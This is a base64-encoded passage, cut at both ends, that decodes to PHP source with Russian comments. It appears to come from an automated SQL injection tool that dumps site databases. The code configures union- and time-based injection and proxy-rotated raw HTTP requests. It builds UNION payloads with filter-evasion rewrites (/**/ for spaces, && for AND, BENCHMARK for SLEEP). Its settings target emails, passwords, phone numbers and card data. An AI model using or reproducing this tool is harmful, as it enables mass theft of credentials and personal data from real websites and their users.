mxlID0gZmFsc2U7IC8vINCf0YDQvtGB0YLQviDQstGL0LLQvtC0INC90LAg0YHRgtGA0LDQvdC40YbRgyDQu9Cw0LnRgtC+0LLRi9C5LCDQstGL0LLQvtC0IHNxbCDQt9Cw0L/RgNC+0YHQvtCyCgkkdGhpcy0+ZGVidWcgPWZhbHNlOy8vINCx0L7Qu9C10LUg0L/QvtC70L3Ri9C5INCy0YvQstC+0LQg0LjQvdC+0LPQtNCwINGBINC/0L7Qu9C90L7RgdGC0YzRjiDQt9Cw0LPRgNGD0LbQtdC90L3QvtC5INGB0YLRgNCw0L3QuNGG0LXQuSDQtNC70Y8g0LTQtdCx0LDQs9CwCgkKCQoJLy/QpNGD0L3QutGG0LjQuCDQv9GA0L7QstC10YDQutC4INGI0LXQu9C70L7QsgoJJHRoaXMtPmxvY2FsX3NoZWxscyA9IGZhbHNlOy8v0LXRgdC70Lgg0LLRiyDQsdGD0LTQtdGC0LUg0LjRgdC/0L7Qu9GM0LfQvtCy0LDRgtGMINGE0LDQudC70LjQuiDQtNC70Y8g0LLQt9C70L7QvNCwINC90LAg0YHQstC+0LjRhSDRgdC10YDQstC10YDQsNGFLCDQvdC+INCy0Ysg0LzQvtC20LXRgtC1INGA0LDQt9C80L3QvtC20LjRgtGMINC+0LTQuNC9INC4INGC0L7RgiDQttC1INGE0LDQudC7KGZhbHNlKSwg0LIg0L/RgNC+0YLQuNCy0L3QvtC8INGB0LvRg9GH0LDQtSDQtNGD0LHQu9C4INGD0LTQsNC70Y/RgtGM0YHRjyB0cnVlCgkvL9C90LUg0LfQsNCx0YPQtNGMINGD0LrQsNC30LDRgtGMINCyIGFwcC93ZWJyb290L2xvY2FsX3NoZWxscyAgINGC0LjQv9CwINGC0LDQuiBodHRwOi8vSVAvZ2V0X3Bvc3QucGhwP2tleT1zZGZhZHNnaDQ1MTNzZEdHNDM1MzQxRkRHV1dERkdERkhERkdEU0ZHREZTR0RGRyDQuCDQstGL0LrQu9GO0YfQuNGC0YwgaHRhY2Nlc3Mg0LDQstGC0L7RgNC40LfQsNGG0LjRjgoJCgkKCQoJJHRoaXMtPmR1bXBfYWxsX3BvdG9rID0zOwoJCgkvL9Cc0LXRgtC+0LTQu9GPINC+0YLQvtCx0YDQsNC20LXQvdC40Y8g0LjQvdGE0L7RgNC80LDRhtC40LgsINC+0LHQstC+0LvQsNC60LjQstCw0LXRgiDRgdC40LzQstC+0LvRiyDQsiDRgtGDINC40LvQuCDQuNC90YPRjiDQutC+0L3RgdGC0YDRg9C60YbQuNGOIENIQVIgSEVYIElGTlVMTAoJLy/Qm9C+0LzQsNC10YLRgdGPINC60LDQutC+0Lkg0L7QtNC40L0g0LHQtdGA0LXRgtGB0Y8g0L3QsNC40LHQvtC70LXQtSDQvtC/0YLQuNC80LDQu9GM0L3Ri9C5CgkkdGhpcy0+bWV0aG9kX2F1dG8gPXRydWU7Ly/QsdGD0LTQtdGCINC70L7QvNCw0YLRjNGB0Y8g0LTQstGD0LzRjyDRgdC/0L7RgdC+0LHQsNC80Lgg0L/QviDQvtGH0LXRgNC10LTQuCwg0LXRgdC70Lgg0YLRg9GCINCy0LrQu9GO0YfQsNC10YLQtSBUUlVFINGC0L4g0YLQvtCz0LTQsCBoZXgg0LggY2hhciDQv9C+0YHRgtCw0LLRjNGC0LUgZmFsc2UKCSR0aGlzLT5tZXRob2RfaGV4ID0gZmFsc2U7IC8v0LTQu9GPINCy0LrQu9GO0YfQtdC90LjRjyDQstC30LvQvtC80LAg0YfQtdGA0LXQtyBIRVgg0LLRgtC+0YDQvtC5INGB0YLQsNCy0YzRgtC1IEZBTFNFINGA0LDQsdC+0YLQsNGC0Ywg0LHRg9C00LXRgiDQuNC70Lgg0YLQvtGCINC4INC70Lgg0Y3RgtC+0YIgCgkkdGhpcy0+bWV0aG9kX2NoYXIgPSBmYWxzZTsKCSR0aGlzLT5tZXRob2RfaWZudWxsID0gZmFsc2U7CgkKCQoJLy/QnNC10YLQvtC00Ysg0LLQt9C70L7QvNCwINCw0L3QsNC70L7QsyAgLS1yaXNrIDIKCSR0aGlzLT50eXBlX3Nwb3NvYl91bmlvbj10cnVlOwoJJHRoaXMtPnR5cGVfc3Bvc29iX3NsZWVwPXRydWU7CgkKCQoJJHRoaXMtPnBvdG9rX2R1bXBfb25lID0gNzAwMDA7Ly/RgdC60L7Qu9GM0LrQviDQt9CwINGA0LDQtyDQsdGD0LTQtdGCINC60LDRh9Cw0YLRjCDQvtC00LjQvSDQv9C+0YLQvtC6LCDQtdGB0LvQuCDQsdC+0LvRjNGI0LUg0Y3RgtC+0Lkg0YbRi9GE0YDRiyDQsdGD0LTQtdGCINCx0LDQt9CwLCDRgtC+INC60LDRh9Cw0YLRjCDQsdGD0LTQtdGCINCyIDYg0L/QvtGC0L7QutC+0LIg0LHQuNGC0YzRgdGPCgkKCSR0aGlzLT5jYXJkX21pbiA9IDUwMDsKCQoJLy/QnNC10YLQvtC0INC+0LHRgNCw0LHQvtGC0LrQuCBVUkwgLS1kZWNvZGUKCSR0aGlzLT51cmxfZW5jb2RlX2F1dG8gPSBmYWxzZTsKCSR0aGlzLT51cmxfZW5jb2RlID0gdHJ1ZTsKCQoJCgkKCSR0aGlzLT5saW5rX2NvdW50ID0gMzsKCQoJCgkvL9Ck0YPQvdC60YbQuNC4INC+0YLQstC10YfQsNGO0YnQuNC1INC30LAg0LTQsNC80L/QuNC90LMKCSR0aGlzLT5tdWx0aWR1bXBfb25lID0gdHJ1ZTsgLy8g0LLRi9C60LvRjtGH0LjRgtGMINGB0LrQsNGH0LrRgyDQvNGL0Lsg0YfQtdGA0LXQtyDQvtC00LjQvdC+0YfQvdGL0Lkg0LTQsNC80L/QuNC90LMKCSR0aGlzLT5tdWx0aWR1bXBfbmFtZV9waG9uZSA9IGZhbHNlOyAvLyDQsNCy0LzQsNGC0LjRh9C10YHQutC40Lkg0L/QtdGA0LXQvdC+0YEg0LjQtyDQvtGB0L3QvtCy0L3Ri9GFINGC0LDQsdC70LjRhiDQvdCw0LnQtNC10L3QvdGL0YUg0LjQvNC10L0g0LvQvtCz0LjQvdC+0LIg0YLQtdC70LXRhNC+0L3QviDQsiDQvNC+0LTRg9C70Ywg0LDQstGC0L7QvNCw0YLQuNGH0LXRgdC60L7Qs9C+INC00LDQvNC/0LjQvdCz0LAg0Lgg0LjRhSDRgdC60LDRh9C60LAKCgkKCSR0aGlzLT5kdW1wX29uZV9nb29kID0gZmFsc2U7ICAvLyDQldGB0LvQuCDQsdGD0LTQtdGCIFRSVUUg0YLQviDQsdGD0LTQtdGCINC60LDRh9Cw0YLRjCDQtNC+INGD0L/QvtGA0LAg0LzRi9C70L4g0L/QsNGB0YEsINC10YHQu9C4IGZhbHNlINGC0L4g0LXRgdC70Lgg0LHRg9C00LXRgiAyMCDQv9GD0YHRgtGL0YUg0LfQvdCw0YfQtdC90LjQuSDRgdGC0L7Qv9C90LXRgiwgVFJVRSDRgtC+INGE0YPQvdC60YbQuNC4INC90LjQttC1INC90LUg0LHRg9C00YPRgiDRgNCw0LHQvtGC0LDRgtGMINC00L4g0YPQv9C+0YDQsCDQsdGD0LTQtdGCCgkkdGhpcy0+dXAgPSBmYWxzZTsgIC8v0LXRgdC70Lgg0LLQutC70Y7Rh9C40YLQviDRgtC+INGC0L7QttC1INC00L4g0YPQv9C+0YDQsCDQsdGD0LTQtdGCINC60LDRh9Cw0YLRjCDQutGA0LjQstGL0LUg0LHQuNGC0YvQtSDQstGB0Y/QutC40LUg0LzRi9C70LAuINCt0KLQniDQlNCb0K8g0JzQkNCh0KHQntCS0J7Qk9CeINCU0JDQnNCf0JjQndCT0JAg0JzQq9CbINCYINCc0KvQm9CeINCf0JDQodChCgkkdGhpcy0+dXBfb25lID0gdHJ1ZTsvL9Cd0L7QstGL0Lkg0L/QsNGA0LDQvNC10YLRgCDQtNC70Y8g0L7QtNC40L3QvtGH0L3QvtCz0L4g0LTQsNC80L/QuNC90LPQsCwg0LXRgdC70LggVFJVRSDRgtC+INCx0YPQtNC10YIg0YHRgtCw0YDQsNGC0YzRgdGPINC00L4g0YPQv9C+0YDQsCDQstGL0LrQsNGH0LDRgtGMCgkKCQoJJHRoaXMtPm51bGxfY291bnQgPSAzMDA7Ly/QtdGB0LvQuCDQvtGC0LTQsNGR0YIg0L/RgNGP0LwgTlVMTCDQuNC70Lgg0L/QsNGB0YEg0YHQu9C40YjQutC+0Lwg0LrQvtGA0L7RgtC60LjQuSDQuNC70Lgg0YHRgtC+0L8g0YHQu9C+0LLQsCDQsiDQv9Cw0YDQvtC70Y/RhQoJJHRoaXMtPmh1bnRhPTMwMDsgLy8gYyDQv9GD0YHRgtGL0Lwg0LLQsNGJ0LUg0LfQvdCw0YfQtdC90LjQtdC8INC10YHQu9C4INGB0YLQvtC70YzQutC+INCx0YPQtNC10YIg0YLQviDQv9C+0YLQvtC6INC/0LXRgNC10LfQsNC/0YPRgdGC0LjRgtGM0YHRjwoJJHRoaXMtPnBhc3NfZW1wdHkgPSAxNzUwOyAvL9GBINC/0YPRgdGC0YvQvCDQv9Cw0YHRgdC+0LwsINC10YHQu9C4INGB0YLQvtC70YzQutC+INCx0YPQtNC10YIgLi4uCgkkdGhpcy0+ZW1haWxfYmFkID0gNzUwMDsgLy/QutGA0LjQstGL0LUg0LzRi9C70LAg0LXRgdC70Lgg0LHRg9C00YPRgiDRgtC+Li4uCgkkdGhpcy0+ZGxpbmEgPSA1NTAwOyAvL9C+0LTQuNC90LDQutC+0LLRi9C1INC/0L4g0LTQu9C40L3QtSDQv9C+INC80YvQu9CwINC10YHQu9C4INC40LTRg9GCCgkKCQoJCgkvL9CR0KvQktCo0JjQlSDQvdCw0YHRgtGA0L7QudC60Lgg0LjQtyDRgtCw0LHQu9C40YbRiyBzZXR0aW5ncwoJJHRoaXMtPnBvdG9rX29uZSA9IDE7Ly8g0JLQviDRgdC60L7Qu9GM0LrQviDQv9C+0YLQvtC60L7QsiDQsdGD0LTQtdGCINC60LDRh9Cw0YLRjNGB0Y8g0LzRi9C70L4g0LjQvNGPLCDQvNGL0LvQviDRgtC10LvQtdGE0L7QvSwg0LzRi9C70L4g0LvQvtCz0LjQvSwg0LvRg9GH0YjQtSDQvdC1INGC0YDQvtCz0LDRgtGMCgkkdGhpcy0+ZHVtcF9vbmUgPTE7IC8v0LLQutC70Y7Rh9C40YLRjCDRgdC60LDRh9C60YMg0L/RgNC+0YHRgtC+INCc0KvQmywg0LHQtdC3INC/0LDRgdGB0L7QsgoJJHRoaXMtPmNoZWNrX3VybCA9IDE7CgkkdGhpcy0+cG90b2sgPTY7CgkkdGhpcy0+cGFzcyA9IDM7CgkKCSR0aGlzLT5zbGl2X3NhdmUgPSB0cnVlOyAvL9Cx0YPQtNGD0YIg0LvQuCDQutCw0YfQsNGC0YzRgdGPINCyINC/0LDQv9C60YMg0LHQtdC3INC+0YLRgdC10LjQstCw0L3QuNGPINC90LAg0LTRg9Cx0LvQuCDRh9C10YDQtdC3INCR0JQKCSR0aGlzLT5zbGl2X3Bhc3Nfc2F2ZSA9IHRydWU7CgkKCQoJCgkKCQoJCgkkdGhpcy0+ZHVtcF9hbGxfc2liID0gdHJ1ZTsKCSR0aGlzLT5zcWxtYXBfY2hlY2sgPSBmYWxzZTsgLy8g0JXQodCb0Jgg0JLQmtCb0K7Qp9CV0J3QkCDQlNCQ0J3QndCQ0K8g0J7Qn9Cm0JjQryDQotCeINCn0JXQoNCV0Jcg0J7QkdCr0KfQndCr0Jkg0JLQl9Cb0J7QnCDQndCVINCR0KPQlNCj0KIg0J/QoNCe0JLQldCg0K/QotCs0KHQryDQm9CY0J3QmtCYINCa0J7QotCe0KDQq9CVINCf0J7QnNCV0KfQldCd0Ksg0JrQkNCaINCd0JAg0KfQldCaINCi0J7Qm9Cs0JrQniDQp9CV0KDQldCXIFNRTE1BUAoJCgkKCQoJCgkKCQkvLyR0aGlzLT5kKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJy9jb25maWcucGhwJywnY29uZmlnJyk7CgkJCgl9CgkKCQoJCgkKCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCS8vLy8vLy8vLy8vLy8vLy8vLy8vL3NsZWVwINGE0YPQvdC60YbQuNC4INC00LvRjyBzcWxpKCkgLy8vLy8vLy8vLy8vLy8vLy8JCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkKCQoJCglmdW5jdGlvbiBzZW5kX3BhY2tldCgkcGFja2V0LCR0eXBlPSdhbGwnLCRyZXQyPSdjb250ZW50Jyl7CgoKCWlmKCR0aGlzLT5wcm94eSAhPScnICBBTkQgJHRoaXMtPnByb3h5X2VuYWJsZSA9PSB0cnVlKQoJewoJCQoJCSRyYW5kX2tleXMgPSBhcnJheV9yYW5kICgkdGhpcy0+cHJveHkpOwoJCSRzID0gZXhwbG9kZSgnOicsJHRoaXMtPnByb3h5WyRyYW5kX2tleXNdKTsKCQkkdGhpcy0+ZCgkcywnc2xlZXBfc2VuZF9wYWNrZXQnKTsKCQkKCQkKCQkkdGhpcy0+c2V0Wyd1cHJveHknXT10cnVlOwoJCSR0aGlzLT5zZXRbJ3Bob3N0J109dHJpbSgkc1swXSk7CgkJJHRoaXMtPnNldFsncHBvcnQnXSA9dHJpbSgkc1sxXSk7CgkJJGZwPUBmc29ja29wZW4oJHRoaXMtPnNldFsncGhvc3QnXSwkdGhpcy0+c2V0WydwcG9ydCddKTsKCX0KCWVsc2UKCXsgCgkJLy8kdGhpcy0+ZCgnTk8gdXByb3h5Jyk7CgkJJGZwPUBmc29ja29wZW4oJHRoaXMtPnNldFsnaG9zdCddLDgwKTsKCX0KCgkvLyR0aGlzLT5kKCRwYWNrZXQsJ3Bha2V0Jyk7CgkKCQoJLy8kdGhpcy0+ZCgkdGhpcy0+c2V0LCckdGhpcy0+c2V0Jyk7CgkKCWlmKCRmcCkKCXsKCQkvLyR0aGlzLT5kKCR0aGlzLT5zZXRbJ2hvc3QnXS4nICBob3N0ISEnKTsKCQlmd3JpdGUoJGZwLCRwYWNrZXQpOwoJCWlmKCRyZXQyPT0ndGltZScpJHVzWyd0bXN0cnQnXT10aW1lKCk7CgkJJGR0PScnOwoJCXdoaWxlKCFmZW9mKCRmcCkpCgkJewoJCQkkZHQuPWZnZXRzKCRmcCk7CgkJCXN0cmVhbV9zZXRfdGltZW91dCgkZnAsIDE1KTsKCQkJCgkJCQoJCQkkaW5mbyA9IHN0cmVhbV9nZXRfbWV0YV9kYXRhKCRmcCk7CgkJCWlmKCRpbmZvWyd0aW1lZF9vdXQnXSkKCQkJewoJCQkJLy9yZXR1cm4gZmFsc2U7CgkJCQkkdGhpcy0+c2V0Wyd0aW1lb3V0J10gPSAxOwoJCQl9CgkJCQoJCQlpZigkdHlwZT09J2hlYWRlcicpewoKCQkJCWlmKHN0cnBvcygkZHQsIlxyXG5cclxuIikpYnJlYWs7CgkJCX0KCQl9CgkJZmNsb3NlKCRmcCk7CgkJaWYoJHJldDI9PSd0aW1lJykKCQl7CgkJCSR1c1sndG1zdHJ0J109KHRpbWUoKS0kdXNbJ3Rtc3RydCddKTsKCQkJJGR0PSR1c1sndG1zdHJ0J107CgkJfQoJfWVsc2UKCXsKCQkkdGhpcy0+ZCgnc2xlZXAgTklIVVlBIE5FIFNLQUNBSExPUycpOwoJCSRkdD1mYWxzZTsKCX0KCglyZXR1cm4gJGR0Owp9CgkKCWZ1bmN0aW9uIGNyZWF0ZV9wYWNrZXQoJHBhdGgsJGdldD0nJywkcG9zdD0nJywkY29va2llPScnLCRoZWFkZXJzPWFycmF5KCkpewoJLy9nbG9iYWwgJHRoaXMtPnNldDsKCgkkdG1wWydBY2NlcHQtTGFuZ3VhZ2UnXT0nZW4tdXMsZW4nOwoJJHRtcFsnQWNjZXB0LUNoYXJzZXQnXT0ndXRmLTgsKic7CgkkdG1wWydBY2NlcHQnXT0ndGV4dC9odG1sLGltYWdlL2pwZWcsaW1hZ2UvZ2lmLHRleHQveG1sLHRleHQvcGxhaW4saW1hZ2UvcG5nJzsKCSR0bXBbJ1VzZXItQWdlbnQnXT0nT3BlcmEvOS4yNyc7CglpZighZW1wdHkoJGNvb2tpZSkpJHRtcFsnQ29va2llJ109JGNvb2tpZTsKCWlmKCFlbXB0eSgkcG9zdCkpewoJCSR0bXBbJ0NvbnRlbnQtVHlwZSddPSdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnOwoJCSR0bXBbJ0NvbnRlbnQtTGVuZ3RoJ109c3RydmFsKHN0cmxlbigkcG9zdCkpOwoJfQoJJHRtcFsnSG9zdCddPSR0aGlzLT5zZXRbImhvc3QiXTsKCSR0bXBbJ0Nvbm5lY3Rpb24nXT0nY2xvc2UnOwoKCWZvcmVhY2goJGhlYWRlcnMgYXMgJGtleSA9PiAkdmFsdWUpewoJCWlmKCFlbXB0eSgka2V5KSYmIWVtcHR5KCR2YWx1ZSkpJHRtcFska2V5XT0kdmFsdWU7Cgl9CgoJaWYoJHRoaXMtPmh0dHBzKQoJewoJCWlmKCFlbXB0eSgkcG9zdCkpJGhlYWRlcj0iUE9TVCAiLiR0aGlzLT5zZXRbInBhdGNoIl0uJHBhdGguJz8nLiRnZXQuIiBIVFRQUy8xLjBcclxuIjsKCQllbHNlICRoZWFkZXI9IkdFVCAiLiR0aGlzLT5zZXRbInBhdGgiXS4kcGF0aC4nPycuJGdldC4iIEhUVFBTLzEuMFxyXG4iOwoJCS8vJHRoaXMtPmQoJHRoaXMtPnNldFsiaG9zdCJdLiR0aGlzLT5zZXRbInBhdGgiXS4kcGF0aC4nPycuJGdldCk7Cgl9ZWxzZXsKCQlpZighZW1wdHkoJHBvc3QpKSRoZWFkZXI9IlBPU1QgIi4kdGhpcy0+c2V0WyJwYXRjaCJdLiRwYXRoLic/Jy4kZ2V0LiIgSFRUUC8xLjBcclxuIjsKCQllbHNlICRoZWFkZXI9IkdFVCAiLiR0aGlzLT5zZXRbInBhdGgiXS4kcGF0aC4nPycuJGdldC4iIEhUVFAvMS4wXHJcbiI7CgkJLy8kdGhpcy0+ZCgkdGhpcy0+c2V0WyJob3N0Il0uJHRoaXMtPnNldFsicGF0aCJdLiRwYXRoLic/Jy4kZ2V0KTsKCX0KCQoJCgkvLyR0aGlzLT5kKCRoZWFkZXIsJyRoZWFkZXInKTsKCQoJCgkKCWlmKCR0aGlzLT5odHRwcyl7CgkJJHRoaXMtPnNldFsic2NoZW1lIl0gPSAnaHR0cHMnOwoJfWVsc2V7CgkJJHRoaXMtPnNldFsic2NoZW1lIl0gPSAnaHR0cCc7Cgl9CgkgJHRoaXMtPnNxbGlbJ3NxbGlfc2xlZXAnXVtdID0gIHJhd3VybGRlY29kZSgkdGhpcy0+c2V0WyJzY2hlbWUiXS4nOi8vJy4kdG1wWydIb3N0J10uJHRoaXMtPnNldFsicGF0aCJdLiRwYXRoLic/Jy4kZ2V0KTsKCSAKCSAkdGhpcy0+c3FsaVsnc3FsaV9zbGVlcF9lbmNvZGUnXVtdID0gICR0aGlzLT5zZXRbInNjaGVtZSJdLic6Ly8nLiR0bXBbJ0hvc3QnXS4kdGhpcy0+c2V0WyJwYXRoIl0uJHBhdGguJz8nLiRnZXQ7CgkgCgkKCWZvcmVhY2goJHRtcCBhcyAka2V5ID0+ICR2YWx1ZSkKCXsKCQkKCQlpZighZW1wdHkoJGtleSkmJiFlbXB0eSgkdmFsdWUpKSRoZWFkZXIuPSRrZXkuJzogJy4kdmFsdWUuIlxyXG4iOwoJCQoJfQoJJGhlYWRlci49IlxyXG4iOwoKCWlmKCFlbXB0eSgkcG9zdCkpJGhlYWRlci49JHBvc3Q7CgkKCXJldHVybiAkaGVhZGVyOwp9CgoJZnVuY3Rpb24gY3JlYXRlX3NxbCgkc3FsLCRjbnQ9JycsJG51bT0nJywkY29uY2F0PXRydWUsJHR5cGU9J251bScpewoKCgkkdG1wPScnOwoJaWYoZW1wdHkoJGNudCkpJGNudD0kdGhpcy0+c2V0WydzbGVlcCddWydjb2x1bW5zJ107CglpZihlbXB0eSgkbnVtKSkkbnVtPSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ291dHAnXTsKCglmb3IoJGk9MTskaTw9JGNudDskaSsrKQoJewoKCQlpZigkbnVtIT0kaSkKCQl7CgkJCWlmKCR0eXBlPT0nbnVtJykkdG1wLj0kaS4nLCc7CgkJCWVsc2UgJHRtcC49J05VTEwsJzsKCQl9ZWxzZQoJCXsKCQkJaWYoKCFlbXB0eSgkdGhpcy0+c2V0WydzbGVlcCddWydoZXgnXSkpICYmICgkdGhpcy0+c2V0WydzbGVlcCddWydoZXgnXSkgQU5EICR0aGlzLT5tZXRob2RfaGV4PT1mYWxzZSkkc3FsPSdVTkhFWChIRVgoJy4kc3FsLicpKSc7CgkJLy8kc3FsPSdVTkhFWChIRVgoJy4kc3FsLicpKSc7CgkJCWlmKCRjb25jYXQpJHRtcC49J0NPTkNBVCgweDY0Njc3OTc0MzYsJy4kc3FsLicsMHgyMTIxMzU2NjY0NkI2ODIxMjEpLCc7CgkJCWVsc2UgJHRtcC49JHNxbC4nLCc7CgkJfQoJfQoJCgkKCS8v0L7QsdGA0LXQt9Cw0LXQvCDQt9Cw0L/Rj9GC0YPRjgoJJHRtcD1zdWJzdHIoJHRtcCwwLHN0cmxlbigkdG1wKS0xKTsKCXJldHVybiAkdG1wOwp9CgoJZnVuY3Rpb24gY3JlYXRlX2dldCgkbmFtZSwkdmFsdWUsJHVybD10cnVlLCRkZWMgPSBmYWxzZSl7CgoKCSR0bXA9Jyc7CgkkdG1wMjI9Jyc7CgkKCS8vJHRoaXMtPmQoJG5hbWUsJ25hbWUnKTsKCQoJLy8kdGhpcy0+ZCgkdmFsdWUsJ3ZhbHVlJyk7CgkKCWZvcmVhY2goJHRoaXMtPnNldFsncXVlcnknXSBhcyAka2V5ID0+ICR2YWwpCgl7CgkKCSAgIC8vJHRoaXMtPmQoJG5hbWUsJ25hbWUnKTsKCQoJICAgaWYoJGRlYykKCSAgIHsJCgkJCWlmKCRuYW1lIT0ka2V5KQoJCQl7CgkJCQkkdG1wLj0ka2V5Lic9Jy4kdmFsLicmJzsKCQkJCSR0bXAyMi49JGtleS4nPScuJHZhbC4nJic7CgkJCX0KCQkJZWxzZQoJCQl7CgkJCQkkdG1wLj0kbmFtZS4nPScuKCR1cmw/JHZhbHVlOiR2YWx1ZSkuJyYnOwoJCQkJJHRtcDIyLj0kbmFtZS4nPScuKCR1cmw/JHZhbHVlOiR2YWx1ZSkuJyYnOwoJCQl9CgkgICB9ZWxzZQoJICAgewoJICAgCgkJCWlmKCRuYW1lIT0ka2V5KQoJCQl7CQoJCQkJJHRtcC49JGtleS4nPScucmF3dXJsZW5jb2RlKCR2YWwpLicmJzsJCgkJCQkkdG1wMjIuPSRrZXkuJz0nLiR2YWwuJyYnOwkKCQkJfQoJCQllbHNlCgkJCXsKCQkJCSR0bXAuPSRuYW1lLic9Jy4oJHVybD9yYXd1cmxlbmNvZGUoJHZhbHVlKTokdmFsdWUpLicmJzsKCQkJCSR0bXAyMi49JG5hbWUuJz0nLigkdXJsPyR2YWx1ZTokdmFsdWUpLicmJzsKCQkJfQkKCSAgIH0KCX0KCQoJLy8kdGhpcy0+ZCgkdG1wLCd0bXAnKTsKCQoJJHRtcD1zdWJzdHIoJHRtcCwwLHN0cmxlbigkdG1wKS0xKTsKCSR0bXAyMj1zdWJzdHIoJHRtcDIyLDAsc3RybGVuKCR0bXAyMiktMSk7CgkkdGhpcy0+dG1wMjIgPSAkdG1wMjI7CglyZXR1cm4gJHRtcDsKfQoKCWZ1bmN0aW9uIGNsZWFyX3NxbCgkc3FsKXsKCS8vZ2xvYmFsICR0aGlzLT5zZXQsJHRoaXMtPnNlYzsKCglpZigkdGhpcy0+ZHVtcGZpbGU9PXRydWUpewoJCQoJCSRzcWwgPSAkdGhpcy0+bXlzcWxEdW1wZXJGaWx0ZXIoJHNxbCk7CgkJCgl9CgkKCSRzcWw9JyAnLiRzcWw7CgkKCWlmKCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWyd0cCddKQoJewoJCWlmKCgkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXSkmJighJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ2VkJ10pKQoJCXsKCQkJJHNxbD1zdHJfcmVwbGFjZSgnICcsJy8qKi8nLCRzcWwpOwoJCQkkc3FsPXN0cl9yZXBsYWNlKCctLS8qKi9kJywnLS0nLCRzcWwpOwoJCQkkc3FsPXN0cl9yZXBsYWNlKCcvKiovQU5ELyoqLycsJyYmJywkc3FsKTsKCQkJJHNxbD1zdHJfcmVwbGFjZSgnLyoqL09SLyoqLycsJ3x8Jywkc3FsKTsKCQl9CgoJCWlmKCgkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc3AnXSkmJigkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnZWQnXSkpCgkJewoJCQkkc3FsPXByZWdfcmVwbGFjZSgnL1NFTEVDVCAoQ09OQ0FUW1x3fFxXXSs/KSBGUk9NLycsJ1NFbGVDVChcMSlGcm9NJywkc3FsKTsKCQkJJHNxbD1wcmVnX3JlcGxhY2UoJy9GUk9NIChbXHd8XFddKz8pIC8nLCdGcm9NYFwxYCcsJHNxbCk7CgkJCSRzcWw9cHJlZ19yZXBsYWNlKCcvV0hFUkUgKFtcd1xXXSs/KSAoTEltaVQgW1x3fFxXXSspPy8nLCdXSGVyRShgXDFgKScsJHNxbCk7CgkJfQoKCQlpZigkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnYW4nXSkKCQl7CgkJCSRzcWw9c3RyX3JlcGxhY2UoJ0FORCcsJyYmJywkc3FsKTsKCQkJJHNxbD1zdHJfcmVwbGFjZSgnIE9SICcsJyB8fCAnLCRzcWwpOwoJCQkkc3FsPXN0cl9yZXBsYWNlKCcqL09SLyonLCcqL3x8LyonLCRzcWwpOwoJCQkkc3FsPXN0cl9yZXBsYWNlKCInT1InIiwiJ3x8JyIgLCRzcWwpOwoJCQkkc3FsPXN0cl9yZXBsYWNlKCJPUigiLCJ8fCgiICwkc3FsKTsKCQl9CgoJCWlmKCR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2ZsdCddWydxdCddKQoJCXsKCQkJJHNxbD1zdHJfcmVwbGFjZSgiQ0hBUignNTgnKSIsIkNIQVIoJzo6JykiLCRzcWwpOwoJCQkkc3FsPXByZWdfcmVwbGFjZSgnL1wnKFtcd3xcV10rPylcJy9lJywnIjB4Ii5iaW4yaGV4KCJcMSIpLiIiJywkc3FsKTsKCQkJJHNxbD1zdHJfcmVwbGFjZSgnQU5EJywnJiYnLCRzcWwpOwoJCQkKCQkJJHNxbD1wcmVnX3JlcGxhY2UoJy9PUlteREVSXS8nLCd8fCcsJHNxbCk7CgkJfQoJfQoKCWlmKCEkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnc2wnXSkkc3FsPXN0cl9yZXBsYWNlKCdTTEVFUCgnLiR0aGlzLT5zZWMuJyknLCdCRU5DSE1BUksoMjk5OTk5OSxNRDUoTk9XKCkpKScsJHNxbCk7CglpZigkdGhpcy0+c2V0WydzbGVlcCddWydmbHQnXVsnbmwnXSkkc3FsPWNocigwKS4kc3FsOwoJaWYoJHRoaXMtPnNldFsnc2xlZXAnXVsnZmx0J11bJ3NxJ10pJHNxbD0iJyIuJHNxbDsKCSRzcWw9JHRoaXMtPnJldFsnc2xlZXAnXVsndmFsJ10uJHNxbDsKCXJldHVybiAkc3FsOwp9CgoJZnVuY3Rpb24gc2VuZF9zcWwoJHNxbCwkcGFyc2U9dHJ1ZSwkZGVidWc9ZmFsc2UpewoJCgkKCQoJJHRtcD0gJHRoaXMtPmNsZWFyX3NxbCgnQU5EIDE9MicuJHRoaXMtPnNldFsnc2xlZXAnXVsnc2NiJ10uJyB1TmlPTiBhbGwgJy4kc3FsLiR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2NvbWVudCddKTsKCWlmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoJHRtcCwnY2xlYXJfc3FsJyk7fQoJCgkKCSR0bXA9JHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRtcCk7CglpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCR0aGlzLT5zZXRbJ2Z1bGwnXS4kdG1wLCdzZXRbZnVsbF0rY3JlYXRlX2dldCcpO30KCS8vaWYoJHRoaXMtPmRlYnVnPT10cnVlKXskdGhpcy0+ZCgkdGhpcy0+c2V0WydmdWxsJ10uJHRoaXMtPnRtcDIyLCd0bXAyMicpO30KCQoJCgkvL2V4aXQ7CgkKCWlmKCRkZWJ1ZylyZXR1cm4gJHRtcDsKCQoJJGtrayA9ICR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0bXApOwoJCgkkdG1wPSR0aGlzLT5zZW5kX3BhY2tldCgka2trKTsKCS8vJHRoaXMtPmQoJHRtcCwnc2VuZCcpOwoJCgkvL2ZpbGVfcHV0X2NvbnRlbnRzKCcuL2ZpbGVfc2xlZXAudHh0JywkdG1wKTsKCS8vZXhpdDsKCQkKCWlmKCRwYXJzZSkKCXsKCQlpZihwcmVnX21hdGNoKCcvZGd5dDYoW1x3fFxXXSs/KSEhNWZka2ghIS8nLCR0